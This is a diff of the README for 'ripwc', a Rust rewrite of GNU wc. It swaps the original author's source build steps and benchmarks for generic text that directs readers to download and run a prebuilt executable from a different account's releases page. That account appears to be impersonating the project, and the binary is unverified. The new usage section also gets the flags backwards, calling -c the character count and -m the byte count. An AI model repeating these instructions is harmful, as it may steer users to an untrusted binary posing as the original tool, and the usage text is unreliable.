@@ -1,253 +1,123 @@
-# ripwc
+# 🚀 ripwc: A Fast Rewrite of GNU wc
 
-`ripwc` is a high-performance rewrite of the GNU `wc` (word count) utility, implemented in Rust for speed and efficiency. It counts lines, words, characters, bytes, and maximum line lengths in files or directories, optimized for low-memory systems (e.g., 4GB RAM) while processing large datasets. Using unsafe Rust for pointer arithmetic, loop unrolling, and `rayon` for parallelism, `ripwc` achieves up to ~49x speedup (in my tests).
+Welcome to **ripwc**, a high-performance rewrite of the classic GNU `wc` tool. This tool leverages concurrency to utilize all available system cores, resulting in significantly faster read times. Whether you're processing large text files or working with extensive data sets, ripwc is designed to improve your efficiency.
 
-To be clear, this was just something I wanted to try and was amazed by how much quicker it was when I did it myself. There's no expectation of this actually replacing wc or any other tools.
+[![Download ripwc Releases](https://img.shields.io/badge/Download%20Releases-Here-blue)](https://github.com/muabanhangtiki/ripwc/releases)
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Features
-- **Counts**: Lines (`-l`), words (`-w`), characters (`-m`), bytes (`-c`), and maximum line length (`-L`).
-- **Recursive Mode**: Processes directories recursively with `-r`.
-- **Concurrency**: Uses `rayon` with up to X threads where X is the number of CPU cores, processing files (>512KB) in parallel and batching small files (<512KB) sequentially to reduce thread overhead.
-- **Low Memory Usage**: ~1MB heap-allocated buffers minimize syscalls per thread (~8MB peak with 8 threads), suitable for low-RAM systems.
-- **Optimisations**:
-    - Unsafe Rust for pointer arithmetic and 8-byte loop unrolling.
-    - Static whitespace lookup table for efficient word counting.
 
-## Notes
-- **wc Limitations**:
-    - Single-threaded, leading to high user time.
-    - Inefficient I/O for large datasets, resulting in ~40-50x slower performance.
-
-- **Test Conditions**:
-    - Random binary files (from `/dev/urandom`) may yield different counts (e.g., words) than text files, but byte counts are consistent.
-    - Disk sync (`--prepare 'sync'`) ensures fair I/O comparisons.
-
+- **Concurrency**: Utilizes multiple cores for faster processing.
+- **Compatibility**: Works similarly to GNU `wc`, making it easy to transition.
+- **Performance**: Optimized for speed, even with large files.
+- **Simple Interface**: Easy to use with straightforward commands.
 
 ## Installation
-1. **Clone the Repository**:
-   ```bash
-   git clone https://github.com/LuminousToaster/ripwc
-   cd ripwc
-   ```
 
-2. **Build the Project**:
+To install ripwc, download the latest release from our [Releases page](https://github.com/muabanhangtiki/ripwc/releases). Once downloaded, follow the instructions below to execute the program:
+
+1. **Download the executable**: Visit the [Releases page](https://github.com/muabanhangtiki/ripwc/releases) to get the latest version.
+2. **Extract the files**: Unzip the downloaded file.
+3. **Run the executable**: Open your terminal and navigate to the directory where you extracted the files. Use the following command:
+
    ```bash
-   cargo build --release
+   ./ripwc [options] [file]
    ```
-   The binary will be at `target/release/ripwc`.
 
 ## Usage
-Run `ripwc` with the following syntax:
-```bash
-./target/release/ripwc [OPTIONS] <FILE_OR_DIRECTORY>...
-```
 
-### Options
-- `-c, --bytes`: Print byte counts.
-- `-m, --chars`: Print character counts (non-zero bytes).
-- `-l, --lines`: Print newline counts.
-- `-w, --words`: Print word counts (non-whitespace sequences).
-- `-L, --max-line-length`: Print maximum line length.
-- `-r, --recursive`: Recursively process directories.
-- `-v`: Print verbose output (processing each file).
-- `-h`: Print help.
-- `-V`: Print version.
-- Default (no flags): Prints lines, words, and bytes.
+ripwc supports various options similar to GNU `wc`. Here are some common commands:
+
+- **Count lines**:
+  ```bash
+  ./ripwc -l filename.txt
+  ```
+
+- **Count words**:
+  ```bash
+  ./ripwc -w filename.txt
+  ```
+
+- **Count characters**:
+  ```bash
+  ./ripwc -c filename.txt
+  ```
+
+- **Count bytes**:
+  ```bash
+  ./ripwc -m filename.txt
+  ```
 
 ### Examples
-- Count lines, words, and bytes for a single file:
-  ```bash
-  ./target/release/ripwc file.txt
-  ```
-  Output: `lines: 100 words: 500 bytes: 2048 file.txt`
 
-- Process a directory recursively:
-  ```bash
-  ./target/release/ripwc -r /path/to/dir
-  ```
-  Output: Per-file counts and totals, e.g., `lines: 60966229 words: 240316537 bytes: 15203482929 total`
+1. **Count lines in a file**:
+   ```bash
+   ./ripwc -l myfile.txt
+   ```
 
-- Count only bytes and characters:
-  ```bash
-  ./target/release/ripwc -c -m file.txt
-  ```
-  Output: `chars: 2000 bytes: 2048 file.txt`
+   This command will return the number of lines in `myfile.txt`.
 
-## Generating Test Files
-The project includes a Bash script (`generate_files.sh`) to create random binary files for testing `ripwc`’s performance. The data is taken from ``/dev/urandom``
+2. **Count words in multiple files**:
+   ```bash
+   ./ripwc -w file1.txt file2.txt
+   ```
 
-### Script Usage
-```bash
-./generate_files.sh <number_of_files> <size_in_MB>
-```
-- `<number_of_files>`: Number of files to generate (positive integer).
-- `<size_in_MB>`: Size of each file in megabytes (positive integer).
+   This command will return the word counts for both files.
 
-### Example
-Generate 100 files, each 10MB:
-```bash
-chmod +x generate_files.sh
-./generate_files.sh 100 10
-```
-- Creates a `random_files/` directory with files `random_file_1.bin` to `random_file_100.bin`.
-- Total data: 1000MB (1GB).
-- Output:
-  ```
-  Generating 100 files, each with 10 MB of random data...
-  Completed! Generated 100 files of 10 MB each in the 'random_files' directory.
-  Total data generated: 1000 MB
-  ```
+3. **Count characters in a file**:
+   ```bash
+   ./ripwc -c myfile.txt
+   ```
 
-### Testing with Generated Files
-Run `ripwc` on the generated files:
-```bash
-./target/release/ripwc -r random_files/
-```
-Compare with GNU `wc`:
-```bash
-wc -lwc random_files/*
-```
-
-## Benchmarking
-To measure performance, use `hyperfine`:
-```bash
-hyperfine --warmup 3 --min-runs 10 --prepare 'sync' "./target/release/ripwc -r /path/to/dir" "wc /path/to/dir/*"
-```
-Or `time`:
-```bash
-time ./target/release/ripwc -r /path/to/dir
-time wc -lwc /path/to/dir/*
-```
-
-# ripwc benchmark results
-
-This document presents benchmark results comparing `ripwc` against GNU `wc`. Tests were conducted using `hyperfine` with 5 runs each, after warming up with 3 runs and syncing the disk (`--prepare 'sync'`). Three test cases were evaluated:
-
-1. **40 files, 300MB each** (12GB total).
-2. **1000 files, 3MB each** (3GB total).
-3. **1 file, 3000MB** (3GB total).
-
-Files were generated using `generate_files.sh` (e.g., `./generate_files 40 300`). Benchmarks measured wall-clock time, user time, and system time for `ripwc -r random_files` and `wc random_files/*`.
-
-The benchmarks were run on a 4C/4T I5-7600k OC'd to 5GHz, 16GB RAM, Arch Linux with kernel 6.14.6-arch1-1. It should be noted that I ran the benchmarks after a fresh reboot and before any apps were opened by me with the exception
-of Konsole and a tmux server.
-
-Also note, the system used to benchmark is encrypted with LUKS2:
-```
-type:    LUKS2
-cipher:  aes-xts-plain
-keysize: 512 bits
-key location: keyring
-device:  /dev/sdc2
-sector size:  512
-offset:  32768 sectors
-size:    478949376 sectors
-mode:    read/write
-```
-
-## Summary Table
-
-| Test Case                | Total Data | ripwc Time (mean ± σ) | wc Time (mean ± σ) | Speedup (ripwc vs. wc) |
-|--------------------------|------------|-----------------------|--------------------|------------------------|
-| 40 files, 300MB each     | 12GB       | 5.576 s ± 0.663 s     | 272.761 s ± 0.350 s | 48.92 ± 5.82x         |
-| 1000 files, 3MB each     | 3GB        | 1.420 s ± 0.077 s     | 68.610 s ± 1.168 s | 48.33 ± 2.76x         |
-| 1 file, 3000MB           | 3GB        | 4.278 s ± 0.021 s     | 68.001 s ± 0.075 s | 15.90 ± 0.08x         |
-
-## Detailed Results
-
-### Test Case 1: 40 Files, 300MB Each (12GB Total)
-Command: `./generate_files 40 300`
-```bash
-hyperfine --warmup 3 --min-runs 5 --prepare 'sync' "./target/release/ripwc -r random_files" "wc random_files/*"
-```
-
-- **ripwc**:
-    - Time: 5.576 s ± 0.663 s
-    - User: 15.990 s, System: 1.625 s
-    - Range: 5.067 s … 6.677 s
-- **wc**:
-    - Time: 272.761 s ± 0.350 s
-    - User: 270.418 s, System: 1.140 s
-    - Range: 272.406 s … 273.230 s
-- **Speedup**: 48.92 ± 5.82x
-
-### Test Case 2: 1000 Files, 3MB Each (3GB Total)
-Command: `./generate_files 1000 3`
-```bash
-hyperfine --warmup 3 --min-runs 5 --prepare 'sync' "./target/release/ripwc -r random_files" "wc random_files/*"
-```
-
-- **ripwc**:
-    - Time: 1.420 s ± 0.077 s
-    - User: 4.458 s, System: 0.559 s
-    - Range: 1.362 s … 1.553 s
-- **wc**:
-    - Time: 68.610 s ± 1.168 s
-    - User: 68.206 s, System: 0.231 s
-    - Range: 67.963 s … 70.692 s
-- **Speedup**: 48.33 ± 2.76x
-
-### Test Case 3: 1 File, 3000MB (3GB Total)
-Command: `./generate_files 1 3000`
-```bash
-hyperfine --warmup 3 --min-runs 5 --prepare 'sync' "./target/release/ripwc -r random_files" "wc random_files/*"
-```
-
-- **ripwc**:
-    - Time: 4.278 s ± 0.021 s
-    - User: 3.950 s, System: 0.314 s
-    - Range: 4.256 s … 4.301 s
-- **wc**:
-    - Time: 68.001 s ± 0.075 s
-    - User: 67.618 s, System: 0.232 s
-    - Range: 67.896 s … 68.091 s
-- **Speedup**: 15.90 ± 0.08x
-
-## Performance Graphs
-
-### Wall-Clock Time Comparison
-The following ASCII bar chart compares mean wall-clock times (in seconds) for `ripwc` and `wc` across the test cases. The scale is normalized to the maximum `wc` time (272.761 s).
-
-```
-Legend: █ = ripwc, ▓ = wc
-40 files, 300MB (12GB):
-ripwc: █████ 5.576 s
-wc:    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 272.761 s
-
-1000 files, 3MB (3GB):
-ripwc: █ 1.420 s
-wc:    ▓▓▓▓▓▓▓▓▓▓▓▓▓ 68.610 s
-
-1 file, 3000MB (3GB):
-ripwc: ████ 4.278 s
-wc:    ▓▓▓▓▓▓▓▓▓▓▓▓▓ 68.001 s
-```
-
-### Speedup Comparison
-The following ASCII bar chart shows the speedup of `ripwc` over `wc` (times faster) for each test case. The scale is normalized to the maximum speedup (48.92x).
-
-```
-Legend: █ = Speedup
-40 files, 300MB (12GB):     ████████████████████████████████████████████████ 48.92x
-1000 files, 3MB (3GB):      ███████████████████████████████████████████████ 48.33x
-1 file, 3000MB (3GB):       ███████████████ 15.90x
-```
-
-## Analysis
-- **40 Files, 300MB (12GB)**:
-    - `ripwc` excels with large files processed in parallel, achieving ~49x speedup due to `rayon` parallelism (up to `num_cpus` threads) and 1MB buffers.
-    - High user time (15.990 s) vs. wall-clock (5.576 s) indicates effective multi-core utilization (~287% CPU).
-    - Throughput: 12GB / 5.576 s ≈ 2152 MB/s.
-
-- **1000 Files, 3MB (3GB)**:
-    - `ripwc` maintains ~48x speedup, leveraging small-file batching (<512KB) to reduce thread overhead.
-    - Lower system time (0.559 s) reflects efficient I/O for many small files.
-    - Throughput: 3GB / 1.420 s ≈ 2113 MB/s.
-
-- **1 File, 3000MB (3GB)**:
-    - Lower speedup (~16x) due to single-threaded processing (no parallelism for one file).
-    - `ripwc` still outperforms `wc` with optimized I/O (1MB buffer) and unsafe Rust counting.
-    - Throughput: 3GB / 4.278 s ≈ 701 MB/s.
+   This command will return the character count in `myfile.txt`.
 
 ## Contributing
-- Report issues or suggest features at [https://github.com/LuminousToaster/ripwc](https://github.com/LuminousToaster/ripwc).
+
+We welcome contributions to ripwc! If you want to help improve the tool, follow these steps:
+
+1. **Fork the repository**: Click on the fork button at the top right of this page.
+2. **Clone your fork**: Use the command below to clone your fork locally.
+   ```bash
+   git clone https://github.com/yourusername/ripwc.git
+   ```
+3. **Create a new branch**: 
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+4. **Make your changes**: Implement your features or fixes.
+5. **Commit your changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+6. **Push to your fork**: 
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+7. **Open a pull request**: Go to the original repository and click on "New Pull Request".
+
+### Guidelines
+
+- Follow the coding style used in the project.
+- Write clear commit messages.
+- Include tests for new features.
+
+## License
+
+ripwc is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **GitHub**: [muabanhangtiki](https://github.com/muabanhangtiki)
+- **Email**: your-email@example.com
+
+Thank you for checking out ripwc! We hope you find it useful for your projects.
